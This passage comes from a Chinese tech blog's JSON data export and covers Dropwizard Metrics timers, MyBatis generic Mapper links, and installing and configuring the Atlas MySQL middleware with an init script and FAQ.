class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-- Histograms --------------------------------------------</span><br><span class=\"line\">java.util.Queue.queue.histogram</span><br><span class=\"line\">             count = 56</span><br><span class=\"line\">               min = 1122</span><br><span class=\"line\">               max = 99650</span><br><span class=\"line\">              mean = 48735.12</span><br><span class=\"line\">            stddev = 28609.02</span><br><span class=\"line\">            median = 49493.00</span><br><span class=\"line\">              75% &lt;= 72323.00</span><br><span class=\"line\">              95% &lt;= 90773.00</span><br><span class=\"line\">              98% &lt;= 94011.00</span><br><span class=\"line\">              99% &lt;= 99650.00</span><br><span class=\"line\">            99.9% &lt;= 99650.00</span><br></pre></td></tr></table></figure>\n<h4 id=\"Timers\"><a href=\"#Timers\" class=\"headerlink\" title=\"Timers\"></a>Timers</h4><p>Timer&#x5176;&#x5B9E;&#x662F; Histogram &#x548C; Meter &#x7684;&#x7ED3;&#x5408;&#xFF0C; histogram &#x67D0;&#x90E8;&#x5206;&#x4EE3;&#x7801;/&#x8C03;&#x7528;&#x7684;&#x8017;&#x65F6;&#xFF0C; meter&#x7EDF;&#x8BA1;TPS&#x3002;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class TimerTest {</span><br><span class=\"line\"></span><br><span class=\"line\">    public static Random random = new Random();</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args) throws InterruptedException {</span><br><span class=\"line\">        MetricRegistry registry = new MetricRegistry();</span><br><span class=\"line\">        ConsoleReporter reporter = ConsoleReporter.forRegistry(registry).build();</span><br><span class=\"line\">        reporter.start(1, TimeUnit.SECONDS);</span><br><span class=\"line\"></span><br><span class=\"line\">        Timer timer = registry.timer(MetricRegistry.name(TimerTest.class,<span class=\"string\">&quot;get-latency&quot;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">        Timer.Context ctx;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">while</span>(<span class=\"literal\">true</span>){</span><br><span class=\"line\">            ctx = timer.time();</span><br><span class=\"line\">            Thread.sleep(random.nextInt(1000));</span><br><span class=\"line\">            ctx.stop();</span><br><span class=\"line\">        }</span><br><span class=\"line\"></span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>&#x8FD0;&#x884C;&#x4E4B;&#x540E;&#x7ED3;&#x679C;&#x5982;&#x4E0B;&#xFF1A;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-- Timers ------------------------------------------------</span><br><span class=\"line\">com.alibaba.wuchong.metrics.TimerTest.get-latency</span><br><span class=\"line\">             count = 38</span><br><span class=\"line\">         mean rate = 1.90 calls/second</span><br><span class=\"line\">     1-minute rate = 1.66 calls/second</span><br><span class=\"line\">     5-minute rate = 1.61 calls/second</span><br><span class=\"line\">    15-minute rate = 1.60 calls/second</span><br><span class=\"line\">               min = 13.90 milliseconds</span><br><span class=\"line\">               max = 988.71 milliseconds</span><br><span class=\"line\">              mean = 519.21 milliseconds</span><br><span class=\"line\">            stddev = 286.23 milliseconds</span><br><span class=\"line\">            median = 553.84 milliseconds</span><br><span class=\"line\">              75% &lt;= 763.64 milliseconds</span><br><span class=\"line\">              95% &lt;= 943.27 milliseconds</span><br><span class=\"line\">              98% &lt;= 988.71 milliseconds</span><br><span class=\"line\">              99% &lt;= 988.71 milliseconds</span><br><span class=\"line\">            99.9% &lt;= 988.71 milliseconds</span><br></pre></td></tr></table></figure>\n<hr>\n<h3 id=\"&#x5176;&#x4ED6;\"><a href=\"#&#x5176;&#x4ED6;\" class=\"headerlink\" title=\"&#x5176;&#x4ED6;\"></a>&#x5176;&#x4ED6;</h3><p>&#x521D;&#x6B21;&#x4E4B;&#x5916;&#xFF0C;Metrics&#x8FD8;&#x63D0;&#x4F9B;&#x4E86;<a href=\"http://metrics.dropwizard.io/3.1.0/manual/healthchecks/\">HealthCheck</a> &#x7528;&#x6765;&#x68C0;&#x6D4B;&#x67D0;&#x4E2A;&#x67D0;&#x4E2A;&#x7CFB;&#x7EDF;&#x662F;&#x5426;&#x5065;&#x5EB7;&#xFF0C;&#x4F8B;&#x5982;&#x6570;&#x636E;&#x5E93;&#x8FDE;&#x63A5;&#x662F;&#x5426;&#x6B63;&#x5E38;&#x3002;&#x8FD8;&#x6709;<a href=\"https://dropwizard.github.io/metrics/3.1.0/apidocs/com/codahale/metrics/annotation/package-tree.html\">Metrics Annotation</a>&#xFF0C;&#x53EF;&#x4EE5;&#x5F88;&#x65B9;&#x4FBF;&#x5730;&#x5B9E;&#x73B0;&#x7EDF;&#x8BA1;&#x67D0;&#x4E2A;&#x65B9;&#x6CD5;&#xFF0C;&#x67D0;&#x4E2A;&#x503C;&#x7684;&#x6570;&#x636E;&#x3002;&#x611F;&#x5174;&#x8DA3;&#x7684;&#x53EF;&#x4EE5;&#x70B9;&#x8FDB;&#x94FE;&#x63A5;&#x770B;&#x770B;&#x3002;</p>\n<hr>\n<h3 id=\"&#x4F7F;&#x7528;&#x7ECF;&#x9A8C;&#x603B;&#x7ED3;\"><a href=\"#&#x4F7F;&#x7528;&#x7ECF;&#x9A8C;&#x603B;&#x7ED3;\" class=\"headerlink\" title=\"&#x4F7F;&#x7528;&#x7ECF;&#x9A8C;&#x603B;&#x7ED3;\"></a>&#x4F7F;&#x7528;&#x7ECF;&#x9A8C;&#x603B;&#x7ED3;</h3><p>&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5F53;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x7EDF;&#x8BA1;&#x67D0;&#x4E2A;&#x51FD;&#x6570;&#x88AB;&#x8C03;&#x7528;&#x7684;&#x9891;&#x7387;&#xFF08;TPS&#xFF09;&#xFF0C;&#x4F1A;&#x4F7F;&#x7528;Meters&#x3002;&#x5F53;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x7EDF;&#x8BA1;&#x67D0;&#x4E2A;&#x51FD;&#x6570;&#x7684;&#x6267;&#x884C;&#x8017;&#x65F6;&#x65F6;&#xFF0C;&#x4F1A;&#x4F7F;&#x7528;Histograms&#x3002;&#x5F53;&#x6211;&#x4EEC;&#x65E2;&#x8981;&#x7EDF;&#x8BA1;TPS&#x53C8;&#x8981;&#x7EDF;&#x8BA1;&#x8017;&#x65F6;&#x65F6;&#xFF0C;&#x6211;&#x4EEC;&#x4F1A;&#x4F7F;&#x7528;Timers&#x3002;</p>\n<hr>\n<h3 id=\"&#x53C2;&#x8003;&#x8D44;&#x6599;\"><a href=\"#&#x53C2;&#x8003;&#x8D44;&#x6599;\" class=\"headerlink\" title=\"&#x53C2;&#x8003;&#x8D44;&#x6599;\"></a>&#x53C2;&#x8003;&#x8D44;&#x6599;</h3><p><a href=\"http://metrics.dropwizard.io/3.1.0/manual/core/\">Metrics Core</a><br><a href=\"Metrics Getting Started\">Metrics Getting Started</a></p>\n"},{"title":"MyBatis通用Mapper开发","date":"2016-07-09T13:18:00.000Z","toc":false,"_content":"\n\n通常情况下，MyBatis 的增删改查操作需要自己在相应xml中写相关语句，\n但是运用相关工具，其实可以很方便的自动生成单表的所有增删改查(通用的多表联合查询还是需要自己写)。\n也可以根据具体环境，设计相关模板，自动生成符合要求的controller和service。\n\n**使用教程**：[http://git.oschina.net/free/Mapper#mybatis通用mapper3](http://git.oschina.net/free/Mapper#mybatis通用mapper3)\n**具体实践**：[后台权限通用框架](https://github.com/Wasim37/springmvc-mybatis-redis-beanstalkd-druid-bootstrap-shiro-maven-demo)\n","source":"_posts/MyBatis通用Mapper开发.md","raw":"---\ntitle: MyBatis通用Mapper开发\ncategories:\n  - WEB后端\ntags:\n  - MyBatis\ndate: 2016-7-9 21:18:00\ntoc: false\n\n---\n\n\n通常情况下，MyBatis 的增删改查操作需要自己在相应xml中写相关语句，\n但是运用相关工具，其实可以很方便的自动生成单表的所有增删改查(通用的多表联合查询还是需要自己写)。\n也可以根据具体环境，设计相关模板，自动生成符合要求的controller和service。\n\n**使用教程**：[http://git.oschina.net/free/Mapper#mybatis通用mapper3](http://git.oschina.net/free/Mapper#mybatis通用mapper3)\n**具体实践**：[后台权限通用框架](https://github.com/Wasim37/springmvc-mybatis-redis-beanstalkd-druid-bootstrap-shiro-maven-demo)\n","slug":"MyBatis通用Mapper开发","published":1,"updated":"2016-11-17T11:59:42.666Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulbf001dgwtml0daa6pl","content":"<p>&#x901A;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;MyBatis &#x7684;&#x589E;&#x5220;&#x6539;&#x67E5;&#x64CD;&#x4F5C;&#x9700;&#x8981;&#x81EA;&#x5DF1;&#x5728;&#x76F8;&#x5E94;xml&#x4E2D;&#x5199;&#x76F8;&#x5173;&#x8BED;&#x53E5;&#xFF0C;<br>&#x4F46;&#x662F;&#x8FD0;&#x7528;&#x76F8;&#x5173;&#x5DE5;&#x5177;&#xFF0C;&#x5176;&#x5B9E;&#x53EF;&#x4EE5;&#x5F88;&#x65B9;&#x4FBF;&#x7684;&#x81EA;&#x52A8;&#x751F;&#x6210;&#x5355;&#x8868;&#x7684;&#x6240;&#x6709;&#x589E;&#x5220;&#x6539;&#x67E5;(&#x901A;&#x7528;&#x7684;&#x591A;&#x8868;&#x8054;&#x5408;&#x67E5;&#x8BE2;&#x8FD8;&#x662F;&#x9700;&#x8981;&#x81EA;&#x5DF1;&#x5199;)&#x3002;<br>&#x4E5F;&#x53EF;&#x4EE5;&#x6839;&#x636E;&#x5177;&#x4F53;&#x73AF;&#x5883;&#xFF0C;&#x8BBE;&#x8BA1;&#x76F8;&#x5173;&#x6A21;&#x677F;&#xFF0C;&#x81EA;&#x52A8;&#x751F;&#x6210;&#x7B26;&#x5408;&#x8981;&#x6C42;&#x7684;controller&#x548C;service&#x3002;</p>\n<p><strong>&#x4F7F;&#x7528;&#x6559;&#x7A0B;</strong>&#xFF1A;<a href=\"http://git.oschina.net/free/Mapper#mybatis&#x901A;&#x7528;mapper3\" target=\"_blank\" rel=\"external\">http://git.oschina.net/free/Mapper#mybatis&#x901A;&#x7528;mapper3</a><br><strong>&#x5177;&#x4F53;&#x5B9E;&#x8DF5;</strong>&#xFF1A;<a href=\"https://github.com/Wasim37/springmvc-mybatis-redis-beanstalkd-druid-bootstrap-shiro-maven-demo\" target=\"_blank\" rel=\"external\">&#x540E;&#x53F0;&#x6743;&#x9650;&#x901A;&#x7528;&#x6846;&#x67B6;</a></p>\n","excerpt":"","more":"<p>&#x901A;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;MyBatis &#x7684;&#x589E;&#x5220;&#x6539;&#x67E5;&#x64CD;&#x4F5C;&#x9700;&#x8981;&#x81EA;&#x5DF1;&#x5728;&#x76F8;&#x5E94;xml&#x4E2D;&#x5199;&#x76F8;&#x5173;&#x8BED;&#x53E5;&#xFF0C;<br>&#x4F46;&#x662F;&#x8FD0;&#x7528;&#x76F8;&#x5173;&#x5DE5;&#x5177;&#xFF0C;&#x5176;&#x5B9E;&#x53EF;&#x4EE5;&#x5F88;&#x65B9;&#x4FBF;&#x7684;&#x81EA;&#x52A8;&#x751F;&#x6210;&#x5355;&#x8868;&#x7684;&#x6240;&#x6709;&#x589E;&#x5220;&#x6539;&#x67E5;(&#x901A;&#x7528;&#x7684;&#x591A;&#x8868;&#x8054;&#x5408;&#x67E5;&#x8BE2;&#x8FD8;&#x662F;&#x9700;&#x8981;&#x81EA;&#x5DF1;&#x5199;)&#x3002;<br>&#x4E5F;&#x53EF;&#x4EE5;&#x6839;&#x636E;&#x5177;&#x4F53;&#x73AF;&#x5883;&#xFF0C;&#x8BBE;&#x8BA1;&#x76F8;&#x5173;&#x6A21;&#x677F;&#xFF0C;&#x81EA;&#x52A8;&#x751F;&#x6210;&#x7B26;&#x5408;&#x8981;&#x6C42;&#x7684;controller&#x548C;service&#x3002;</p>\n<p><strong>&#x4F7F;&#x7528;&#x6559;&#x7A0B;</strong>&#xFF1A;<a href=\"http://git.oschina.net/free/Mapper#mybatis&#x901A;&#x7528;mapper3\">http://git.oschina.net/free/Mapper#mybatis&#x901A;&#x7528;mapper3</a><br><strong>&#x5177;&#x4F53;&#x5B9E;&#x8DF5;</strong>&#xFF1A;<a href=\"https://github.com/Wasim37/springmvc-mybatis-redis-beanstalkd-druid-bootstrap-shiro-maven-demo\">&#x540E;&#x53F0;&#x6743;&#x9650;&#x901A;&#x7528;&#x6846;&#x67B6;</a></p>\n"},{"title":"MySQL中间件Atlas安装及使用","date":"2016-10-18T10:24:17.000Z","toc":false,"_content":"\n### 简介\nAtlas是由 Qihoo 360公司Web平台部基础架构团队开发维护的一个基于MySQL协议的数据中间层项目。它在MySQL官方推出的MySQL-Proxy 0.8.2版本的基础上，修改了大量bug，添加了很多功能特性。而且安装方便。配置的注释写的蛮详细的，都是中文。\n\n### 主要功能\n- 读写分离\n- 从库负载均衡\n- IP过滤\n- 自动分表\n- DBA可平滑上下线DB\n- 自动摘除宕机的DB\n\n### 相关链接\nMysql中间件产品比较：http://songwie.com/articlelist/44\nAtlas的安装：https://github.com/Qihoo360/Atlas/wiki/Atlas的安装\nAtlas功能特点FAQ：https://github.com/Qihoo360/Atlas/wiki/Atlas功能特点FAQ\nAtlas性能特点：https://github.com/Qihoo360/Atlas/wiki/Atlas的性能测试\nAtlas架构：https://github.com/Qihoo360/Atlas/wiki/Atlas的架构\nAtlas+Keepalived：http://sofar.blog.51cto.com/353572/1601552\nAtlas各项功能验证：http://blog.itpub.net/27000195/viewspace-1421262/\n\n<!-- more -->\n\n> 官网教程很详细，且是中文，这里就不详述相关安装过程了\n\n### 设置开机自启动\n```bash\necho \"/usr/local/mysql-proxy/bin/mysql-proxyd test start\" >> /etc/rc.local\n```\n\n### 添加atlas服务\n```bash\n# 编写简单的Atlas启动脚本\nvim /etc/init.d/atlas\n\n#!/bin/sh  \n\nstart()  \n{  \n        /usr/local/mysql-proxy/bin/mysql-proxyd test start\n}  \nstop()  \n{  \n        /usr/local/mysql-proxy/bin/mysql-proxyd test stop\n}\nstatus()  \n{       \n        /usr/local/mysql-proxy/bin/mysql-proxyd test status  \n}\nrestart()  \n{  \n        /usr/local/mysql-proxy/bin/mysql-proxyd test restart\n} \nATLAS=\"/usr/local/mysql-proxy/bin/mysql-proxyd\"  \n[ -f $ATLAS ] || exit 1  \n# See how we were called.  \ncase \"$1\" in  \n        start)  \n                start  \n                ;;  \n        stop)  \n                stop  \n                ;;  \n        restart)  \n                restart\n                ;;  \n        status)  \n                status \n                ;;  \n                # stop    sleep 3   start  ;;  \n        *)  \n                echo $\"Usage: $0 {start|stop|status|restart}\"  \n                exit 1  \nesac  \nexit 0 \n\n# atlas服务验证\nservice atlas status\nservice atlas start\nservice atlas restart\nservice atlas stop\n```\n\n### 查看MySQL监听端口\n```bash\netstat -tanlp | grep mysql\ntcp        0      0 0.0.0.0:2345            0.0.0.0:*               LISTEN      21449/mysql-proxy   \ntcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      24096/mysqld        \ntcp        0      0 0.0.0.0:1234            0.0.0.0:*               LISTEN      21449/mysql-proxy\n```\n\n### Atlas安装及卸载\n```bash\n# 安装\nsudo rpm -i Atlas-2.2.1.el6.x86_64.rpm\n\n# 卸载\nsudo rpm -e Atlas-2.2.1.el6.x86_64\n```\n\n### 系列问题\n\n**问题：atlas安装后，读写分离测试，为什么读一直走主库 **\n回答：有事务存在的情况下，会强制走主库。解决方法，添加注解[@Transactional(propagation=Propagation.NOT_SUPPORTED)];\n若不涉及事务，检查主从库的用户名密码配置是否一致，是否设置为允许远程登录，并执行[FLUSH PRIVILEGES]。\n\n**问题：读写分离自测成功，java程序连接Atlas后却不能读写分离，所有的请求都发向主库，这是为什么？**\n回答：检查一下java框架，是不是默认将autocommit设置为0了，很多java框架将语句都封装在一个事务中，而Atlas会将事务请求都发向主库。\n\n**问题：执行相关命令，成功上下线从库DB后，为什么从库仍然可以同步主库数据**\n回答：atlas是中间件，只是提供了访问层的代理，代理和主从没有关系，数据库的主从还需自己配置。而上下线从库DB，只是说读的请求不再发往相应的从库了，事先配置的主从关系并不会改变。还有目前的atlas暂不支持多主模式。\n\n**问题：Atlas碰到解决不了的问题怎么办？**\n回答：将相关环境、步骤和运行截图发邮件至zhuchao[AT]360.cn，或者加QQ群326544838。我一问题纠结了几小时，然后发送邮件了，三分钟后就回复我了，震惊了 (¯﹃¯)\n\n更新中。。。\n\n","source":"_posts/MySQL中间件Atlas安装及使用.md","raw":"---\ntitle: MySQL中间件Atlas安装及使用\ncategories:\n  - 运维部署\ntags:\n  - atlas\n  - mysql\ndate: 2016-10-18 18:24:17\ntoc: false\n---\n\n### 简介\nAtlas是由 Qihoo 360公司Web平台部基础架构团队开发维护的一个基于MySQL协议的数据中间层项目。它在MySQL官方推出的MySQL-Proxy 0.8.2版本的基础上，修改了大量bug，添加了很多功能特性。而且安装方便。配置的注释写的蛮详细的，都是中文。\n\n### 主要功能\n- 读写分离\n- 从库负载均衡\n- IP过滤\n- 自动分表\n- DBA可平滑上下线DB\n- 自动摘除宕机的DB\n\n### 相关链接\nMysql中间件产品比较：http://songwie.com/articlelist/44\nAtlas的安装：https://github.com/Qihoo360/Atlas/wiki/Atlas的安装\nAtlas功能特点FAQ：https://github.com/Qihoo360/Atlas/wiki/Atlas功能特点FAQ\nAtlas性能特点：https://github.com/Qihoo360/Atlas/wiki/Atlas的性能测试\nAtlas架构：https://github.com/Qihoo360/Atlas/wiki/Atlas的架构\nAtlas+Keepalived：http://sofar.blog.51cto.com/353572/1601552\nAtlas各项功能验证：http://blog.itpub.net/27000195/viewspace-1421262/\n\n<!-- more -->\n\n> 官网教程很详细，且是中文，这里就不详述相关安装过程了\n\n### 设置开机自启动\n```bash\necho \"/usr/local/mysql-proxy/bin/mysql-proxyd test start\" >> /etc/rc.local\n```\n\n### 添加atlas服务\n```bash\n# 编写简单的Atlas启动脚本\nvim /etc/init.d/atlas\n\n#!/bin/sh  \n\nstart()  \n{  \n        /usr/local/mysql-proxy/bin/mysql-proxyd test start\n}  \nstop()  \n{  \n        /usr/local/mysql-proxy/bin/mysql-proxyd test stop\n}\nstatus()  \n{       \n        /usr/local/mysql-proxy/bin/mysql-proxyd test status  \n}\nrestart()  \n{  \n        /usr/local/mysql-proxy/bin/mysql-proxyd test restart\n} \nATLAS=\"/usr/local/mysql-proxy/bin/mysql-proxyd\"  \n[ -f $ATLAS ] || exit 1  \n# See how we were called.  \ncase \"$1\" in  \n        start)  \n                start  \n                ;;  \n        stop)  \n                stop  \n                ;;  \n        restart)  \n                restart\n                ;;  \n        status)  \n                status \n                ;;  \n                # stop    sleep 3   start  ;;  \n        *)  \n                echo $\"Usage: $0 {start|stop|status|restart}\"  \n                exit 1  \nesac  \nexit 0 \n\n# atlas服务验证\nservice atlas status\nservice atlas start\nservice atlas restart\nservice atlas stop\n```\n\n### 查看MySQL监听端口\n```bash\netstat -tanlp | grep mysql\ntcp        0      0 0.0.0.0:2345            0.0.0.0:*               LISTEN      21449/mysql-proxy   \ntcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      24096/mysqld        \ntcp        0      0 0.0.0.0:1234            0.0.0.0:*               LISTEN      21449/mysql-proxy\n```\n\n### Atlas安装及卸载\n```bash\n# 安装\nsudo rpm -i Atlas-2.2.1.el6.x86_64.rpm\n\n# 卸载\nsudo rpm -e Atlas-2.2.1.el6.x86_64\n```\n\n### 系列问题\n\n**问题：atlas安装后，读写分离测试，为什么读一直走主库 **\n回答：有事务存在的情况下，会强制走主库。解决方法，添加注解[@Transactional(propagation=Propagation.NOT_SUPPORTED)];\n若不涉及事务，检查主从库的用户名密码配置是否一致，是否设置为允许远程登录，并执行[FLUSH PRIVILEGES]。\n\n**问题：读写分离自测成功，java程序连接Atlas后却不能读写分离，所有的请求都发向主库，这是为什么？**\n回答：检查一下java框架，是不是默认将autocommit设置为0了，很多java框架将语句都封装在一个事务中，而Atlas会将事务请求都发向主库。\n\n**问题：执行相关命令，成功上下线从库DB后，为什么从库仍然可以同步主库数据**\n回答：atlas是中间件，只是提供了访问层的代理，代理和主从没有关系，数据库的主从还需自己配置。而上下线从库DB，只是说读的请求不再发往相应的从库了，事先配置的主从关系并不会改变。还有目前的atlas暂不支持多主模式。\n\n**问题：Atlas碰到解决不了的问题怎么办？**\n回答：将相关环境、步骤和运行截图发邮件至zhuchao[AT]360.cn，或者加QQ群326544838。我一问题纠结了几小时，然后发送邮件了，三分钟后就回复我了，震惊了 (¯﹃¯)\n\n更新中。。。\n\n","slug":"MySQL中间件Atlas安装及使用","published":1,"updated":"2016-11-17T11:59:42.666Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulbh001ggwtm6p7nlgsm","content":"<h3 id=\"&#x7B80;&#x4ECB;\"><a href=\"#&#x7B80;&#x4ECB;\" class=\"headerlink\" title=\"&#x7B80;&#x4ECB;\"></a>&#x7B80;&#x4ECB;</h3><p>Atlas&#x662F;&#x7531; Qihoo 360&#x516C;&#x53F8;Web&#x5E73;&#x53F0;&#x90E8;&#x57FA;&#x7840;&#x67B6;&#x6784;&#x56E2;&#x961F;&#x5F00;&#x53D1;&#x7EF4;&#x62A4;&#x7684;&#x4E00;&#x4E2A;&#x57FA;&#x4E8E;MySQL&#x534F;&#x8BAE;&#x7684;&#x6570;&#x636E;&#x4E2D;&#x95F4;&#x5C42;&#x9879;&#x76EE;&#x3002;&#x5B83;&#x5728;MySQL&#x5B98;&#x65B9;&#x63A8;&#x51FA;&#x7684;MySQL-Proxy 0.8.2&#x7248;&#x672C;&#x7684;&#x57FA;&#x7840;&#x4E0A;&#xFF0C;&#x4FEE;&#x6539;&#x4E86;&#x5927;&#x91CF;bug&#xFF0C;&#x6DFB;&#x52A0;&#x4E86;&#x5F88;&#x591A;&#x529F;&#x80FD;&#x7279;&#x6027;&#x3002;&#x800C;&#x4E14;&#x5B89;&#x88C5;&#x65B9;&#x4FBF;&#x3002;&#x914D;&#x7F6E;&#x7684;&#x6CE8;&#x91CA;&#x5199;&#x7684;&#x86EE;&#x8BE6;&#x7EC6;&#x7684;&#xFF0C;&#x90FD;&#x662F;&#x4E2D;&#x6587;&#x3002;</p>\n<h3 id=\"&#x4E3B;&#x8981;&#x529F;&#x80FD;\"><a href=\"#&#x4E3B;&#x8981;&#x529F;&#x80FD;\" class=\"headerlink\" title=\"&#x4E3B;&#x8981;&#x529F;&#x80FD;\"></a>&#x4E3B;&#x8981;&#x529F;&#x80FD;</h3><ul>\n<li>&#x8BFB;&#x5199;&#x5206;&#x79BB;</li>\n<li>&#x4ECE;&#x5E93;&#x8D1F;&#x8F7D;&#x5747;&#x8861;</li>\n<li>IP&#x8FC7;&#x6EE4;</li>\n<li>&#x81EA;&#x52A8;&#x5206;&#x8868;</li>\n<li>DBA&#x53EF;&#x5E73;&#x6ED1;&#x4E0A;&#x4E0B;&#x7EBF;DB</li>\n<li>&#x81EA;&#x52A8;&#x6458;&#x9664;&#x5B95;&#x673A;&#x7684;DB</li>\n</ul>\n<h3 id=\"&#x76F8;&#x5173;&#x94FE;&#x63A5;\"><a href=\"#&#x76F8;&#x5173;&#x94FE;&#x63A5;\" class=\"headerlink\" title=\"&#x76F8;&#x5173;&#x94FE;&#x63A5;\"></a>&#x76F8;&#x5173;&#x94FE;&#x63A5;</h3><p>Mysql&#x4E2D;&#x95F4;&#x4EF6;&#x4EA7;&#x54C1;&#x6BD4;&#x8F83;&#xFF1A;<a href=\"http://songwie.com/articlelist/44\" target=\"_blank\" rel=\"external\">http://songwie.com/articlelist/44</a><br>Atlas&#x7684;&#x5B89;&#x88C5;&#xFF1A;<a href=\"https://github.com/Qihoo360/Atlas/wiki/Atlas&#x7684;&#x5B89;&#x88C5;\" target=\"_blank\" rel=\"external\">https://github.com/Qihoo360/Atlas/wiki/Atlas&#x7684;&#x5B89;&#x88C5;</a><br>Atlas&#x529F;&#x80FD;&#x7279;&#x70B9;FAQ&#xFF1A;<a href=\"https://github.com/Qihoo360/Atlas/wiki/Atlas&#x529F;&#x80FD;&#x7279;&#x70B9;FAQ\" target=\"_blank\" rel=\"external\">https://github.com/Qihoo360/Atlas/wiki/Atlas&#x529F;&#x80FD;&#x7279;&#x70B9;FAQ</a><br>Atlas&#x6027;&#x80FD;&#x7279;&#x70B9;&#xFF1A;<a href=\"https://github.com/Qihoo360/Atlas/wiki/Atlas&#x7684;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;\" target=\"_blank\" rel=\"external\">https://github.com/Qihoo360/Atlas/wiki/Atlas&#x7684;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;</a><br>Atlas&#x67B6;&#x6784;&#xFF1A;<a href=\"https://github.com/Qihoo360/Atlas/wiki/Atlas&#x7684;&#x67B6;&#x6784;\" target=\"_blank\" rel=\"external\">https://github.com/Qihoo360/Atlas/wiki/Atlas&#x7684;&#x67B6;&#x6784;</a><br>Atlas+Keepalived&#xFF1A;<a href=\"http://sofar.blog.51cto.com/353572/1601552\" target=\"_blank\" rel=\"external\">http://sofar.blog.51cto.com/353572/1601552</a><br>Atlas&#x5404;&#x9879;&#x529F;&#x80FD;&#x9A8C;&#x8BC1;&#xFF1A;<a href=\"http://blog.itpub.net/27000195/viewspace-1421262/\" target=\"_blank\" rel=\"external\">http://blog.itpub.net/27000195/viewspace-1421262/</a></p>\n<a id=\"more\"></a>\n<blockquote>\n<p>&#x5B98;&#x7F51;&#x6559;&#x7A0B;&#x5F88;&#x8BE6;&#x7EC6;&#xFF0C;&#x4E14;&#x662F;&#x4E2D;&#x6587;&#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x4E0D;&#x8BE6;&#x8FF0;&#x76F8;&#x5173;&#x5B89;&#x88C5;&#x8FC7;&#x7A0B;&#x4E86;</p>\n</blockquote>\n<h3 id=\"&#x8BBE;&#x7F6E;&#x5F00;&#x673A;&#x81EA;&#x542F;&#x52A8;\"><a href=\"#&#x8BBE;&#x7F6E;&#x5F00;&#x673A;&#x81EA;&#x542F;&#x52A8;\" class=\"headerlink\" title=\"&#x8BBE;&#x7F6E;&#x5F00;&#x673A;&#x81EA;&#x542F;&#x52A8;\"></a>&#x8BBE;&#x7F6E;&#x5F00;&#x673A;&#x81EA;&#x542F;&#x52A8;</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;/usr/local/mysql-proxy/bin/mysql-proxyd test start&quot;</span> &gt;&gt; /etc/rc.local</span><br></pre></td></tr></table></figure>\n<h3 id=\"&#x6DFB;&#x52A0;atlas&#x670D;&#x52A1;\"><a href=\"#&#x6DFB;&#x52A0;atlas&#x670D;&#x52A1;\" class=\"headerlink\" title=\"&#x6DFB;&#x52A0;atlas&#x670D;&#x52A1;\"></a>&#x6DFB;&#x52A0;atlas&#x670D;&#x52A1;</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span 